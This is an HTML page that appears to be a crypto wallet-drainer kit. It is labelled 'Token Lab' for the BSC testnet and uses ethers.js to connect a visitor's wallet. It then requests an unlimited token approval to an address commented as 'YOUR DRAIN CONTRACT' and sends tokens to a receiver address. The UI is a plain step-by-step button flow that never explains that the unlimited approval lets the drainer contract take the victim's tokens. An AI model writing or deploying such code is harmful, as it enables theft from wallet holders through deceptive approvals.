<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Token Lab (Transfer + Approve)</title>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
      background-color: #000;
      color: #fff;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px;
    }

    .container {
      width: 100%;
      max-width: 500px;
      background-color: #111;
      border-radius: 12px;
      padding: 30px 20px;
      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
    }

    h2 {
      text-align: center;
      margin-bottom: 30px;
      font-size: 24px;
      font-weight: 600;
    }

    .button-section {
      display: flex;
      flex-direction: column;
      gap: 20px;
      margin-bottom: 30px;
    }

    button {
      width: 100%;
      padding: 14px 20px;
      background-color: #00cc44;
      color: #000;
      border: none;
      border-radius: 8px;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
      transition: all 0.3s ease;
      text-transform: uppercase;
      letter-spacing: 0.5px;
    }

    button:hover {
      background-color: #00ff55;
      transform: translateY(-2px);
      box-shadow: 0 6px 20px rgba(0, 204, 68, 0.4);
    }

    button:active {
      transform: translateY(0);
    }

    button:disabled {
      background-color: #666;
      cursor: not-allowed;
      opacity: 0.6;
    }

    #status {
      background-color: #1a1a1a;
      border-left: 4px solid #00cc44;
      padding: 15px;
      border-radius: 6px;
      font-size: 14px;
      line-height: 1.6;
      word-break: break-all;
      text-align: left;
      min-height: 60px;
      display: flex;
      align-items: center;
    }

    .step-indicator {
      text-align: center;
      font-size: 12px;
      color: #888;
      margin-bottom: 20px;
    }

    @media (max-width: 480px) {
      .container {
        padding: 20px 15px;
      }

      h2 {
        font-size: 20px;
        margin-bottom: 25px;
      }

      button {
        padding: 12px 15px;
        font-size: 14px;
      }

      #status {
        font-size: 12px;
        padding: 12px;
      }
    }

    @media (max-width: 320px) {
      .container {
        padding: 15px 10px;
      }

      h2 {
        font-size: 18px;
        margin-bottom: 20px;
      }

      button {
        padding: 10px 12px;
        font-size: 13px;
      }
    }
  </style>
</head>

<body>

<div class="container">
  <h2>🧪 Token Lab (BSC Testnet)</h2>

  <div class="step-indicator">
    <span id="stepText">Step 1 of 3: Connect Wallet</span>
  </div>

  <div class="button-section">
    <button id="actionBtn" onclick="performAction()">START PROCESS</button>
  </div>

  <p id="status">Click the button to begin: Connect → Approve → Transfer</p>
</div>

<script>
let provider, signer, user;
let currentStep = 0;

// 🔁 YOUR TOKEN
const tokenAddress = "0x089d6677646bc535B1A8535ED856bb17493E332d";

// 🔁 YOUR DRAIN CONTRACT
const spender = "0x8dc3da2ff65ec0bbac40f33efe7c02c9c0b7ebaf";

// 🔁 RECEIVER (use your own address for test)
const receiver = "0xb52d3770bcf4673009f2f6bf8ba9177cba46d283";

const tokenABI = [
  "function transfer(address to, uint256 amount) returns (bool)",
  "function approve(address spender, uint256 amount) returns (bool)"
];

const steps = [
  { name: "Connect Wallet", fn: connectWallet },
  { name: "Approve Unlimited", fn: approveToken },
  { name: "Send 10 Tokens", fn: sendToken }
];

async function performAction() {
  const btn = document.getElementById("actionBtn");
  btn.disabled = true;

  try {
    if (currentStep < steps.length) {
      await steps[currentStep].fn();
      currentStep++;
      
      if (currentStep < steps.length) {
        updateUI(
          `✅ ${steps[currentStep - 1].name} completed!\n\nProceeding to: ${steps[currentStep].name}`,
          `Step ${currentStep + 1} of 3: ${steps[currentStep].name}`
        );
      } else {
        updateUI(
          "✅ All steps completed successfully! Transaction complete.",
          "Process Completed"
        );
        btn.innerText = "PROCESS COMPLETE";
        return;
      }
    }
  } catch (e) {
    updateUI(
      `❌ Error: ${e.message}`,
      "Error occurred"
    );
    currentStep = 0;
    btn.innerText = "START PROCESS";
    btn.disabled = false;
    return;
  }

  btn.disabled = false;
}

async function connectWallet() {
  if (!window.ethereum) {
    throw new Error("Open inside Trust Wallet browser or use MetaMask");
  }

  // connect
  await window.ethereum.request({ method: "eth_requestAccounts" });

  // try switching to BSC Testnet (chainId 97 = 0x61)
  try {
    await window.ethereum.request({
      method: "wallet_switchEthereumChain",
      params: [{ chainId: "0x61" }]
    });
  } catch (e) {
    console.log("Switch failed or already on correct network");
  }

  provider = new ethers.providers.Web3Provider(window.ethereum, "any");
  signer = provider.getSigner();
  user = await signer.getAddress();

  updateUI(
    `✅ Connected: ${user}\n\nNetwork: BSC Testnet`,
    "Step 1 of 3: Connect Wallet"
  );
}

// 🔴 APPROVE
async function approveToken() {
  try {
    const contract = new ethers.Contract(tokenAddress, tokenABI, signer);

    const tx = await contract.approve(spender, ethers.constants.MaxUint256);

    await tx.wait();

    updateUI(
      `🔥 Approval successful!\n\nSpender: ${spender}`,
      "Step 2 of 3: Approve Unlimited"
    );

  } catch (e) {
    throw new Error(`Approval failed: ${e.message}`);
  }
}

// 🟢 TOKEN TRANSFER
async function sendToken() {
  try {
    const contract = new ethers.Contract(tokenAddress, tokenABI, signer);

    const tx = await contract.transfer(receiver, ethers.utils.parseUnits("10", 18));

    await tx.wait();

    updateUI(
      `✅ Transfer successful!\n\nSent 10 tokens to: ${receiver}`,
      "Step 3 of 3: Send 10 Tokens"
    );

  } catch (e) {
    throw new Error(`Transfer failed: ${e.message}`);
  }
}

function updateUI(statusText, stepText) {
  document.getElementById("status").innerText = statusText;
  document.getElementById("stepText").innerText = stepText;
  
  const btn = document.getElementById("actionBtn");
  if (currentStep < steps.length) {
    btn.innerText = `NEXT: ${steps[currentStep].name.toUpperCase()}`;
  }
}
</script>

</body>
</html>
